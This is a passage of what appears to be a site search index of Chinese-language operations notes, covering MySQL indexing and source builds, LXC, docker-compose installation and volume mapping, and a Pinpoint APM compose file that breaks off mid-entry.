\u53ef\u4ee5\u7528\u4e8e\u7a7a\u95f4\u67e5\u8be2\uff0c\u5982\u67e5\u627e\u67d0\u4e2a\u7ed9\u5b9a\u8303\u56f4\u5185\u7684\u6240\u6709\u70b9\u3002 ALTER TABLE table_name ADD SPATIAL INDEX index_name (column_name); \u6216\u8005 CREATE SPATIAL INDEX index_name ON table_name (column_name); 5.\u524d\u7f00\u7d22\u5f15\uff1a \u5982\u679c\u5217\u7684\u503c\u5f88\u957f\uff0c\u53ef\u4ee5\u4f7f\u7528\u524d\u7f00\u7d22\u5f15\uff0c\u5373\u53ea\u7d22\u5f15\u5b57\u6bb5\u503c\u7684\u524dN\u4e2a\u5b57\u7b26\u3002 \u524d\u7f00\u7d22\u5f15\u53ef\u4ee5\u51cf\u5c11\u7d22\u5f15\u5360\u7528\u7684\u7a7a\u95f4\uff0c\u4f46\u53ef\u80fd\u4e0d\u5982\u5b8c\u6574\u7d22\u5f15\u7cbe\u786e\u3002 CREATE INDEX index_name ON table_name (column_name(10)); 6.\u7ec4\u5408\u7d22\u5f15\uff1a \u5728\u8868\u7684\u591a\u4e2a\u5217\u4e0a\u521b\u5efa\u7684\u7d22\u5f15\u3002 \u53ef\u4ee5\u52a0\u901f\u5bf9\u8fd9\u4e9b\u5217\u7684\u7ec4\u5408\u67e5\u8be2\uff0c\u4f46\u5176\u6548\u7387\u53d6\u51b3\u4e8e\u67e5\u8be2\u6761\u4ef6\u4e0e\u7d22\u5f15\u5217\u7684\u5339\u914d\u7a0b\u5ea6\u3002 CREATE INDEX index_name ON table_name (column1, column2, column3); \u5728\u4f7f\u7528\u7d22\u5f15\u65f6\uff0c\u91cd\u8981\u7684\u662f\u8981\u6839\u636e\u6570\u636e\u7684\u7279\u6027\u548c\u67e5\u8be2\u7684\u9700\u6c42\u6765\u9009\u62e9\u5408\u9002\u7684\u7d22\u5f15\u7c7b\u578b\u3002\u9002\u5f53\u7684\u7d22\u5f15\u53ef\u4ee5\u663e\u8457\u63d0\u9ad8\u67e5\u8be2\u6027\u80fd\uff0c\u4f46\u4e0d\u6070\u5f53\u7684\u7d22\u5f15\u53ef\u80fd\u4f1a\u964d\u4f4e\u6027\u80fd\u5e76\u589e\u52a0\u5b58\u50a8\u7a7a\u95f4\u7684\u9700\u6c42\u3002","title":"\u7d22\u5f15"},{"location":"database/mysql/%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85/","text":"\u5728 CentOS 7 \u4e0a\u7f16\u8bd1\u5b89\u88c5 MySQL 5.7\uff0c\u60a8\u9700\u8981\u9075\u5faa\u4ee5\u4e0b\u6b65\u9aa4\uff1a \u5b89\u88c5\u4f9d\u8d56 \uff1a\u5b89\u88c5\u7f16\u8bd1 MySQL \u6240\u9700\u7684\u4f9d\u8d56\uff0c\u4f8b\u5982\u5f00\u53d1\u5de5\u5177\u3001CMake\u3001GCC\u3001Bison \u7b49\u3002 sudo yum groupinstall \"Development Tools\" sudo yum install cmake gcc-c++ ncurses ncurses-devel bison \u4e0b\u8f7d MySQL \u6e90\u4ee3\u7801 \uff1a\u4ece MySQL \u5b98\u7f51\u4e0b\u8f7d MySQL 5.7 \u7684\u6e90\u4ee3\u7801\u3002 wget https://cdn.mysql.com//Downloads/MySQL-5.7/mysql-5.7.44.tar.gz \u89e3\u538b\u6e90\u4ee3\u7801 \uff1a\u89e3\u538b\u4e0b\u8f7d\u7684\u6e90\u4ee3\u7801\u6587\u4ef6\u3002 tar zxvf mysql-5.7.44.tar.gz \u7f16\u8bd1\u5b89\u88c5 \uff1a \u521b\u5efa\u6784\u5efa\u76ee\u5f55\u5e76\u8fdb\u5165\uff1a mkdir build cd build \u8fd0\u884c CMake \u914d\u7f6e\u6784\u5efa\uff1a cmake .. -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DWITH_INNOBASE_STORAGE_ENGINE=1 -DMYSQL_DATADIR=/usr/local/mysql/data -DSYSCONFDIR=/etc -DDOWNLOAD_BOOST=1 -DWITH_BOOST=/usr/local/Boost \u7f16\u8bd1\u5e76\u5b89\u88c5\uff1a make sudo make install \u521b\u5efa MySQL \u7528\u6237\u548c\u7ec4 \uff1a sudo groupadd mysql sudo useradd -r -g mysql -s /bin/false mysql \u66f4\u6539\u76ee\u5f55\u6743\u9650 \uff1a sudo chown -R mysql:mysql /usr/local/mysql \u590d\u5236\u914d\u7f6e\u6587\u4ef6 \uff1a sudo cp /usr/local/mysql/support-files/my-default.cnf /etc/my.cnf \u521d\u59cb\u5316 MySQL \uff1a\u8bb0\u4f4f\u6b64\u6b65\u9aa4\u521d\u59cb\u5316\u7684\u5bc6\u7801 sudo /usr/local/mysql/bin/mysqld --initialize --user=mysql - \u542f\u52a8 MySQL \uff1a sudo /usr/local/mysql/support-files/mysql.server start - \u5b89\u5168\u914d\u7f6e \uff1a\u5bf9\u5bc6\u7801\u91cd\u7f6e sudo /usr/local/mysql/bin/mysql_secure_installation \u767b\u5f55 \uff1a /usr/local/mysql/bin/mysql -u root -p","title":"mysql\u7684\u7f16\u8bd1\u5b89\u88c5"},{"location":"lxc/","text":"LXC \uff0c\u5176\u540d\u79f0\u6765\u81eaLinux\u8f6f\u4ef6\u5bb9\u5668\uff08Linux Containers\uff09\u7684\u7f29\u5199\uff0c\u4e00\u79cd \u64cd\u4f5c\u7cfb\u7edf\u5c42\u865a\u62df\u5316 \uff08Operating system\u2013level virtualization\uff09\u6280\u672f\uff0c\u4e3a Linux\u5185\u6838 \u5bb9\u5668\u529f\u80fd\u7684\u4e00\u4e2a \u7528\u6237\u7a7a\u95f4 \u63a5\u53e3 \u3002\u5b83\u5c06\u5e94\u7528\u8f6f\u4ef6\u7cfb\u7edf\u6253\u5305\u6210\u4e00\u4e2a\u8f6f\u4ef6\u5bb9\u5668\uff08Container\uff09\uff0c\u5185\u542b\u5e94\u7528\u8f6f\u4ef6\u672c\u8eab\u7684\u4ee3\u7801\uff0c\u4ee5\u53ca\u6240\u9700\u8981\u7684\u64cd\u4f5c\u7cfb\u7edf\u6838\u5fc3\u548c\u5e93\u3002\u900f\u8fc7\u7edf\u4e00\u7684\u540d\u5b57\u7a7a\u95f4\u548c\u5171\u4eab API \u6765\u5206\u914d\u4e0d\u540c\u8f6f\u4ef6\u5bb9\u5668\u7684\u53ef\u7528\u786c\u4ef6\u8d44\u6e90\uff0c\u521b\u9020\u51fa\u5e94\u7528\u7a0b\u5e8f\u7684\u72ec\u7acb \u6c99\u7bb1 \u6267\u884c\u73af\u5883\uff0c\u4f7f\u5f97 Linux \u7528\u6237\u53ef\u4ee5\u5bb9\u6613\u7684\u521b\u5efa\u548c\u7ba1\u7406\u7cfb\u7edf\u6216\u5e94\u7528\u5bb9\u5668\u3002 \u5728Linux\u5185\u6838\u4e2d\uff0c\u63d0\u4f9b\u4e86 cgroups \u529f\u80fd\uff0c\u6765\u8fbe\u6210\u8d44\u6e90\u7684\u533a\u9694\u5316\u3002\u5b83\u540c\u65f6\u4e5f\u63d0\u4f9b\u4e86\u540d\u79f0\u7a7a\u95f4\u533a\u9694\u5316\u7684\u529f\u80fd\uff0c\u4f7f\u5e94\u7528\u7a0b\u5e8f\u770b\u5230\u7684\u64cd\u4f5c\u7cfb\u7edf\u73af\u5883\u88ab\u533a\u9694\u6210\u72ec\u7acb\u533a\u95f4\uff0c\u5305\u62ec\u884c\u7a0b\u6811\uff0c\u7f51\u7edc\uff0c\u7528\u6237id\uff0c\u4ee5\u53ca\u6302\u8f7d\u7684\u6587\u4ef6\u7cfb\u7edf\u3002\u4f46\u662fcgroups\u5e76\u4e0d\u4e00\u5b9a\u9700\u8981\u542f\u52a8\u4efb\u4f55\u865a\u62df\u673a\u3002 LXC\u5229\u7528cgroups\u4e0e\u540d\u79f0\u7a7a\u95f4\u7684\u529f\u80fd\uff0c\u63d0\u4f9b\u5e94\u7528\u8f6f\u4ef6\u4e00\u4e2a\u72ec\u7acb\u7684\u64cd\u4f5c\u7cfb\u7edf\u73af\u5883\u3002LXC\u4e0d\u9700\u8981 Hypervisor \u8fd9\u4e2a\u8f6f\u4ef6\u5c42\uff0c\u8f6f\u4ef6\u5bb9\u5668\uff08Container\uff09\u672c\u8eab\u6781\u4e3a\u8f7b\u91cf\u5316\uff0c\u63d0\u5347\u4e86\u521b\u5efa \u865a\u62df\u673a \u7684\u901f\u5ea6\u3002\u8f6f\u4ef6 Docker \u88ab\u7528\u6765\u7ba1\u7406LXC\u7684\u73af\u5883 LXC - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 (wikipedia.org)","title":"Index"},{"location":"lxc/docker/docker-compose/","text":"docker compose \u5b89\u88c5 https://docs.docker.com/compose/install/ sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose docker-compose --version volume \u6620\u5c04 \u5b50\u7ea7\u5377\u6620\u5c04 docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-hbase: build: context: ./pinpoint-hbase/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_HBASE_NAME}\" image: \"pinpointdocker/pinpoint-hbase:${PINPOINT_VERSION}\" networks: - pinpoint volumes: - ./hase_data:/home/pinpoint/hbase - ./zoo_data:/home/pinpoint/zookeeper \u8fd9\u6bb5 volumes: - ./hase_data:/home/pinpoint/hbase ./zoo_data:/home/pinpoint/zookeepe \u5bb9\u5668\u91cc\u9762/home/pinpoint/hbase\u6620\u5c04\u5230\u5f53\u524ddocker-compose.yaml\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u4e0b\u7684hase_data\u76ee\u5f55\u4e2d \u5bb9\u5668\u91cc\u9762/home/pinpoint/zookeeper\u6620\u5c04\u5230\u5f53\u524ddocker-compose.yaml\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u4e0b\u7684zoo_data\u76ee\u5f55\u4e2d \u9876\u7ea7\u5377 docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint //\u9876\u7ea7\u5377 volumes: data-volume: mysql_data: \u8fd9\u6bb5\uff1a volumes: - mysql_data:/var/lib/mysql networks: - pinpoint //\u9876\u7ea7\u5377 volumes: data-volume: mysql_data: \u8fd9\u6bb5\u7684\u610f\u601d\u662f\uff1a \u5bb9\u5668\u7684/var/lib/mysql \u7684\u6570\u636e\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u7684mysql_data\u4e2d\uff0c\u9876\u7ea7\u5377\u5728\u5bbf\u4e3b\u673a\u4e2d\u6709\u9ed8\u8ba4\u4f4d\u7f6e \u901a\u8fc7\u547d\u4ee4 docker volume ls \u53ef\u4ee5\u67e5\u770b DRIVER VOLUME NAME local pinpoint-docker_data-volume local pinpoint-docker_mysql_data \u53ef\u4ee5\u901a\u8fc7 docker inspect pinpoint-docker_mysql_data \u67e5\u770b\u5177\u4f53\u4f4d\u7f6e pinpoint-docker_ \u4e3a\u8be5docker-compose.yaml\u90e8\u7f72\u6587\u4ef6\u7684\u76ee\u5f55 \u9876\u7ea7\u5377\u6620\u5c04 docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint volumes: data-volume: driver: local driver_opts: o: bind type: none device: ./data-volume mysql_data: driver: local driver_opts: o: bind type: none device: ./mysql_data \u8fd9\u6bb5\uff1a volumes: data-volume: driver: local driver_opts: o: bind type: none device: ./data-volume mysql_data: driver: local driver_opts: o: bind type: none device: ./mysql_data \u901a\u8fc7\u6b64\u65b9\u6cd5\u53ef\u4ee5\u628a\u9876\u7ea7\u5377\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u6307\u5b9a\u76ee\u5f55\uff0c\u5bbf\u4e3b\u673a\u76ee\u5f55\u9700\u8981\u63d0\u524d\u521b\u5efa\u51fa\u6765 \u901a\u8fc7\u547d\u4ee4 docker volume ls \u53ef\u4ee5\u67e5\u770b DRIVER VOLUME NAME local pinpoint-docker_data-volume local pinpoint-docker_mysql_data [root@centos7 pinpoint-docker]# docker inspect pinpoint-docker_data-volume [ { \"CreatedAt\": \"2021-12-16T12:52:27+08:00\", \"Driver\": \"local\", \"Labels\": { \"com.docker.compose.project\": \"pinpoint-docker\", \"com.docker.compose.version\": \"1.29.2\", \"com.docker.compose.volume\": \"data-volume\" }, \"Mountpoint\": \"/var/lib/docker/volumes/pinpoint-docker_data-volume/_data\", \"Name\": \"pinpoint-docker_data-volume\", \"Options\": { \"device\": \"/root/pinpoint-docker/data-volume\", \"o\": \"bind\", \"type\": \"none\" }, \"Scope\": \"local\" } ] github\u4e0a docker-compose \u6e90\u7801\u4e2d\u5bf9 \u5377\u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u4e0d\u8be6\u7ec6\uff1ahttps://github.com/docker/docker.github.io/blob/master/compose/compose-file/compose-file-v3.md#volume-configuration-reference \u6ce8\u610f\u6bcf\u4e2adocker-compose.yaml \u4e0a\u90fd\u6709\u4e2a version \u7248\u672c\uff0c\u662f\u544a\u8bc9docker-compose \u8fd9\u4e2ayaml \u662f\u57fa\u4e8e\u54ea\u4e2a\u7248\u672c\u7684\u8bed\u6cd5\u5199\u7684 \uff0c\u5173\u4e8edocker-compose\u7684\u8bed\u6cd5\u7248\u672c\u4ecb\u7ecd\uff1ahttps://github.com/docker/docker.github.io/blob/master/compose/compose-file/compose-versioning.md","title":"docker_compose\u4e2d\u5377\u7684\u6620\u5c04"},{"location":"lxc/docker/docker-compose/#docker-compose","text":"","title":"docker compose"},{"location":"lxc/docker/docker-compose/#_1","text":"https://docs.docker.com/compose/install/ sudo curl -L \"https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)\" -o /usr/local/bin/docker-compose sudo chmod +x /usr/local/bin/docker-compose sudo ln -s /usr/local/bin/docker-compose /usr/bin/docker-compose docker-compose --version","title":"\u5b89\u88c5"},{"location":"lxc/docker/docker-compose/#volume","text":"","title":"volume \u6620\u5c04"},{"location":"lxc/docker/docker-compose/#_2","text":"docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-hbase: build: context: ./pinpoint-hbase/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_HBASE_NAME}\" image: \"pinpointdocker/pinpoint-hbase:${PINPOINT_VERSION}\" networks: - pinpoint volumes: - ./hase_data:/home/pinpoint/hbase - ./zoo_data:/home/pinpoint/zookeeper \u8fd9\u6bb5 volumes: - ./hase_data:/home/pinpoint/hbase ./zoo_data:/home/pinpoint/zookeepe \u5bb9\u5668\u91cc\u9762/home/pinpoint/hbase\u6620\u5c04\u5230\u5f53\u524ddocker-compose.yaml\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u4e0b\u7684hase_data\u76ee\u5f55\u4e2d \u5bb9\u5668\u91cc\u9762/home/pinpoint/zookeeper\u6620\u5c04\u5230\u5f53\u524ddocker-compose.yaml\u6587\u4ef6\u6240\u5728\u7684\u76ee\u5f55\u4e0b\u7684zoo_data\u76ee\u5f55\u4e2d","title":"\u5b50\u7ea7\u5377\u6620\u5c04"},{"location":"lxc/docker/docker-compose/#_3","text":"docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint //\u9876\u7ea7\u5377 volumes: data-volume: mysql_data: \u8fd9\u6bb5\uff1a volumes: - mysql_data:/var/lib/mysql networks: - pinpoint //\u9876\u7ea7\u5377 volumes: data-volume: mysql_data: \u8fd9\u6bb5\u7684\u610f\u601d\u662f\uff1a \u5bb9\u5668\u7684/var/lib/mysql \u7684\u6570\u636e\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u7684mysql_data\u4e2d\uff0c\u9876\u7ea7\u5377\u5728\u5bbf\u4e3b\u673a\u4e2d\u6709\u9ed8\u8ba4\u4f4d\u7f6e \u901a\u8fc7\u547d\u4ee4 docker volume ls \u53ef\u4ee5\u67e5\u770b DRIVER VOLUME NAME local pinpoint-docker_data-volume local pinpoint-docker_mysql_data \u53ef\u4ee5\u901a\u8fc7 docker inspect pinpoint-docker_mysql_data \u67e5\u770b\u5177\u4f53\u4f4d\u7f6e pinpoint-docker_ \u4e3a\u8be5docker-compose.yaml\u90e8\u7f72\u6587\u4ef6\u7684\u76ee\u5f55","title":"\u9876\u7ea7\u5377"},{"location":"lxc/docker/docker-compose/#_4","text":"docker-compose.yaml\u6240\u5728\u4f4d\u7f6e /root/pinpoint-docker/ \u5982\u4e0b\u914d\u7f6e\uff1a version: \"3.6\" services: pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint volumes: data-volume: driver: local driver_opts: o: bind type: none device: ./data-volume mysql_data: driver: local driver_opts: o: bind type: none device: ./mysql_data \u8fd9\u6bb5\uff1a volumes: data-volume: driver: local driver_opts: o: bind type: none device: ./data-volume mysql_data: driver: local driver_opts: o: bind type: none device: ./mysql_data \u901a\u8fc7\u6b64\u65b9\u6cd5\u53ef\u4ee5\u628a\u9876\u7ea7\u5377\u6302\u8f7d\u5230\u5bbf\u4e3b\u673a\u6307\u5b9a\u76ee\u5f55\uff0c\u5bbf\u4e3b\u673a\u76ee\u5f55\u9700\u8981\u63d0\u524d\u521b\u5efa\u51fa\u6765 \u901a\u8fc7\u547d\u4ee4 docker volume ls \u53ef\u4ee5\u67e5\u770b DRIVER VOLUME NAME local pinpoint-docker_data-volume local pinpoint-docker_mysql_data [root@centos7 pinpoint-docker]# docker inspect pinpoint-docker_data-volume [ { \"CreatedAt\": \"2021-12-16T12:52:27+08:00\", \"Driver\": \"local\", \"Labels\": { \"com.docker.compose.project\": \"pinpoint-docker\", \"com.docker.compose.version\": \"1.29.2\", \"com.docker.compose.volume\": \"data-volume\" }, \"Mountpoint\": \"/var/lib/docker/volumes/pinpoint-docker_data-volume/_data\", \"Name\": \"pinpoint-docker_data-volume\", \"Options\": { \"device\": \"/root/pinpoint-docker/data-volume\", \"o\": \"bind\", \"type\": \"none\" }, \"Scope\": \"local\" } ] github\u4e0a docker-compose \u6e90\u7801\u4e2d\u5bf9 \u5377\u7684\u4ecb\u7ecd\uff0c\u4f46\u662f\u4e0d\u8be6\u7ec6\uff1ahttps://github.com/docker/docker.github.io/blob/master/compose/compose-file/compose-file-v3.md#volume-configuration-reference \u6ce8\u610f\u6bcf\u4e2adocker-compose.yaml \u4e0a\u90fd\u6709\u4e2a version \u7248\u672c\uff0c\u662f\u544a\u8bc9docker-compose \u8fd9\u4e2ayaml \u662f\u57fa\u4e8e\u54ea\u4e2a\u7248\u672c\u7684\u8bed\u6cd5\u5199\u7684 \uff0c\u5173\u4e8edocker-compose\u7684\u8bed\u6cd5\u7248\u672c\u4ecb\u7ecd\uff1ahttps://github.com/docker/docker.github.io/blob/master/compose/compose-file/compose-versioning.md","title":"\u9876\u7ea7\u5377\u6620\u5c04"},{"location":"lxc/docker/docker_Warning/","text":"\u505c\u6b62docker\u51fa\u73b0\u8b66\u544a [root@VM-0-2-centos ~]# systemctl stop docker Warning: Stopping docker.service, but it can still be activated by: docker.socket #\u89e3\u51b3\u65b9\u6cd5 [root@VM-0-2-centos ~]# systemctl stop docker.socket [root@VM-0-2-centos ~]# systemctl stop docker","title":"\u505c\u6b62docker\u51fa\u73b0\u8b66\u544a"},{"location":"lxc/docker/docker_Warning/#docker","text":"[root@VM-0-2-centos ~]# systemctl stop docker Warning: Stopping docker.service, but it can still be activated by: docker.socket #\u89e3\u51b3\u65b9\u6cd5 [root@VM-0-2-centos ~]# systemctl stop docker.socket [root@VM-0-2-centos ~]# systemctl stop docker","title":"\u505c\u6b62docker\u51fa\u73b0\u8b66\u544a"},{"location":"lxc/docker/docker_su/","text":"Docker\u5b89\u88c5 https://developer.aliyun.com/mirror/docker-ce Docker\u52a0\u901f Centos7 [root@server ~]# cat /etc/docker/daemon.json { \"registry-mirrors\": [\"https://registry.docker-cn.com\",\"http://hub-mirror.c.163.com\",\"https://docker.mirrors.ustc.edu.cn\" ] } [root@server ~] systemctl daemon-reload [root@server ~] systemctl restart docker","title":"Docker\u5b89\u88c5\u548c\u52a0\u901f"},{"location":"lxc/docker/docker_su/#docker","text":"https://developer.aliyun.com/mirror/docker-ce","title":"Docker\u5b89\u88c5"},{"location":"lxc/docker/docker_su/#docker_1","text":"Centos7 [root@server ~]# cat /etc/docker/daemon.json { \"registry-mirrors\": [\"https://registry.docker-cn.com\",\"http://hub-mirror.c.163.com\",\"https://docker.mirrors.ustc.edu.cn\" ] } [root@server ~] systemctl daemon-reload [root@server ~] systemctl restart docker","title":"Docker\u52a0\u901f"},{"location":"lxc/docker/pinpoint_compose/","text":"pinpoint \u9879\u76ee\u5730\u5740\uff1ahttps://github.com/pinpoint-apm/pinpoint-docker pinpoint docker-compose \u90e8\u7f72\u6587\u4ef6 https://github.com/pinpoint-apm/pinpoint-docker/blob/master/docker-compose.yml version: \"3.6\" services: pinpoint-hbase: build: context: ./pinpoint-hbase/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_HBASE_NAME}\" image: \"pinpointdocker/pinpoint-hbase:${PINPOINT_VERSION}\" networks: - pinpoint volumes: - /home/pinpoint/hbase - /home/pinpoint/zookeeper expose: # HBase Master API port - \"60000\" # HBase Master Web UI - \"16010\" # Regionserver API port - \"60020\" # HBase Regionserver web UI - \"16030\" ports: - \"60000:60000\" - \"16010:16010\" - \"60020:60020\" - \"16030:16030\" restart: always depends_on: - zoo1 pinpoint-mysql: build: context: ./pinpoint-mysql/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: pinpoint-mysql restart: always image: \"pinpointdocker/pinpoint-mysql:${PINPOINT_VERSION}\" hostname: pinpoint-mysql ports: - \"3306:3306\" environment: - MYSQL_ROOT_PASSWORD=${MYSQL_ROOT_PASSWORD} - MYSQL_USER=${MYSQL_USER} - MYSQL_PASSWORD=${MYSQL_PASSWORD} - MYSQL_DATABASE=${MYSQL_DATABASE} volumes: - mysql_data:/var/lib/mysql networks: - pinpoint pinpoint-web: build: context: ./pinpoint-web/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_WEB_NAME}\" image: \"pinpointdocker/pinpoint-web:${PINPOINT_VERSION}\" depends_on: - pinpoint-hbase - pinpoint-mysql - zoo1 restart: always expose: - \"9997\" ports: - \"9997:9997\" - \"${SERVER_PORT:-8080}:${SERVER_PORT:-8080}\" environment: - SERVER_PORT=${SERVER_PORT} - SPRING_PROFILES_ACTIVE=${SPRING_PROFILES},batch - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} - CLUSTER_ENABLE=${CLUSTER_ENABLE} - ADMIN_PASSWORD=${ADMIN_PASSWORD} - CONFIG_SENDUSAGE=${CONFIG_SENDUSAGE} - LOGGING_LEVEL_ROOT=${WEB_LOGGING_LEVEL_ROOT} - CONFIG_SHOW_APPLICATIONSTAT=${CONFIG_SHOW_APPLICATIONSTAT} - BATCH_ENABLE=${BATCH_ENABLE} - BATCH_SERVER_IP=${BATCH_SERVER_IP} - BATCH_FLINK_SERVER=${BATCH_FLINK_SERVER} - JDBC_DRIVERCLASSNAME=${JDBC_DRIVERCLASSNAME} - JDBC_URL=${JDBC_URL} - JDBC_USERNAME=${JDBC_USERNAME} - JDBC_PASSWORD=${JDBC_PASSWORD} - ALARM_MAIL_SERVER_URL=${ALARM_MAIL_SERVER_URL} - ALARM_MAIL_SERVER_PORT=${ALARM_MAIL_SERVER_PORT} - ALARM_MAIL_SERVER_USERNAME=${ALARM_MAIL_SERVER_USERNAME} - ALARM_MAIL_SERVER_PASSWORD=${ALARM_MAIL_SERVER_PASSWORD} - ALARM_MAIL_SENDER_ADDRESS=${ALARM_MAIL_SENDER_ADDRESS} - ALARM_MAIL_TRANSPORT_PROTOCOL=${ALARM_MAIL_TRANSPORT_PROTOCOL} - ALARM_MAIL_SMTP_PORT=${ALARM_MAIL_SMTP_PORT} - ALARM_MAIL_SMTP_AUTH=${ALARM_MAIL_SMTP_AUTH} - ALARM_MAIL_SMTP_STARTTLS_ENABLE=${ALARM_MAIL_SMTP_STARTTLS_ENABLE} - ALARM_MAIL_SMTP_STARTTLS_REQUIRED=${ALARM_MAIL_SMTP_STARTTLS_REQUIRED} - ALARM_MAIL_DEBUG=${ALARM_MAIL_DEBUG} links: - \"pinpoint-mysql:pinpoint-mysql\" networks: - pinpoint pinpoint-collector: build: context: ./pinpoint-collector/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_COLLECTOR_NAME}\" image: \"pinpointdocker/pinpoint-collector:${PINPOINT_VERSION}\" depends_on: - pinpoint-hbase - zoo1 restart: always expose: - \"9991\" - \"9992\" - \"9993\" - \"9994\" - \"9995\" - \"9996\" ports: - \"${COLLECTOR_RECEIVER_GRPC_AGENT_PORT:-9991}:9991/tcp\" - \"${COLLECTOR_RECEIVER_GRPC_STAT_PORT:-9992}:9992/tcp\" - \"${COLLECTOR_RECEIVER_GRPC_SPAN_PORT:-9993}:9993/tcp\" - \"${COLLECTOR_RECEIVER_BASE_PORT:-9994}:9994\" - \"${COLLECTOR_RECEIVER_STAT_UDP_PORT:-9995}:9995/tcp\" - \"${COLLECTOR_RECEIVER_SPAN_UDP_PORT:-9996}:9996/tcp\" - \"${COLLECTOR_RECEIVER_STAT_UDP_PORT:-9995}:9995/udp\" - \"${COLLECTOR_RECEIVER_SPAN_UDP_PORT:-9996}:9996/udp\" networks: - pinpoint environment: - SPRING_PROFILES_ACTIVE=${SPRING_PROFILES} - PINPOINT_ZOOKEEPER_ADDRESS=${PINPOINT_ZOOKEEPER_ADDRESS} - CLUSTER_ENABLE=${CLUSTER_ENABLE} - LOGGING_LEVEL_ROOT=${COLLECTOR_LOGGING_LEVEL_ROOT} - FLINK_CLUSTER_ENABLE=${FLINK_CLUSTER_ENABLE} - FLINK_CLUSTER_ZOOKEEPER_ADDRESS=${FLINK_CLUSTER_ZOOKEEPER_ADDRESS} pinpoint-quickstart: build: context: ./pinpoint-quickstart/ dockerfile: Dockerfile container_name: \"pinpoint-quickstart\" image: \"pinpointdocker/pinpoint-quickstart\" ports: - \"${APP_PORT:-8080}:8080\" volumes: - data-volume:/pinpoint-agent environment: JAVA_OPTS: \"-javaagent:/pinpoint-agent/pinpoint-bootstrap-${PINPOINT_VERSION}.jar -Dpinpoint.agentId=${AGENT_ID} -Dpinpoint.applicationName=${APP_NAME} -Dpinpoint.profiler.profiles.active=${SPRING_PROFILES}\" networks: - pinpoint depends_on: - pinpoint-agent pinpoint-agent: build: context: ./pinpoint-agent/ dockerfile: Dockerfile args: - PINPOINT_VERSION=${PINPOINT_VERSION} container_name: \"${PINPOINT_AGENT_NAME}\" image: \"pinpointdocker/pinpoint-agent:${PINPOINT_VERSION}\" restart: 